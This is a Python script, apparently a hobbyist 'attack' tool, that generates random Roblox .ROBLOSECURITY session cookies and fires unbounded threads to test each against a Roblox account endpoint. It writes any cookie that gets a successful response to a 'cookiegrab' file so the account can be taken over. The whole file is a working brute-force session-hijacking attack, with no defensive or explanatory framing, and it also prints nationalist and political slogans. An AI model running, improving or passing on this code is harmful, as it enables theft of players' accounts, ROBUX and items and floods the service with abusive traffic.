import random
import string
import requests
import time
import threading
from colorama import init
from termcolor import colored
kume= string.ascii_uppercase + string.digits

init()
print(colored("EN BUYUK ULKE TURKİİYEDİR TURKEY İS THE BEST COUNTRY","red"))
print(colored("FROM THE RİVER TO THE SEA PALESTİNE WİLL BE FREE","red"))
print(colored("CODED BY OMOVSKY","light_green"))
print(colored("python gunlukleri bir numaradir !","yellow"))
def saldiri():
 y= 0 
 sonuc= ""
 while True:
  sonuc= sonuc + random.choice(kume)
  y = y + 1 
  if y == 1514:
   break
 auth_key= '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_'+sonuc
 cookies = {
    'GuestData': 'UserID=-2029349518',
    '__utmz': '223924205.1691295377.38.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided)',
    '_ga': 'GA1.1.1188177230.1692273528',
    '_ga_BK4ZY0C59K': 'GS1.1.1212228977.2.1.1693230292.0.0.0',
    '_gcl_au': '1.1.1951351257.1696673046',
    'RBXSource': 'rbx_acquisition_time=10/20/2023 1:11:00 PM&rbx_acquisition_referrer=&rbx_medium=Direct&rbx_source=&rbx_campaign=&rbx_adgroup=&rbx_keyword=&rbx_matchtype=&rbx_send_info=1',
    '__utma': '201924205.1780409125.1679684617.1697825461.1698477145.92',
    '.ROBLOSECURITY': auth_key,
    'RBXEventTrackerV2': 'CreateDate=11/8/2023 1:27:10 AM&rbxid=5199793166&browserid=166785499812',
    'rbx-ip2': '',
    'RBXSessionTracker': 'sessionid=16147ca9-d101-4a3a-88b4-4bd5dc97dfae',
}

 headers = {
    'authority': 'accountinformation.roblox.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'pragma': 'no-cache',
    'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36',
}

 response = requests.get('https://accountinformation.roblox.com/v1/birthdate', cookies=cookies, headers=headers)
 if response.status_code == 200:
   print(colored("sanlisin","light_blue"))
   open("cookiegrab","a").write(f"{auth_key}\n\n\n\n\n")
 else:
  print(colored(f"olmadi: {auth_key}","light_red"))
while True:
 time.sleep(0.1)
 threading.Thread(target=saldiri).start()
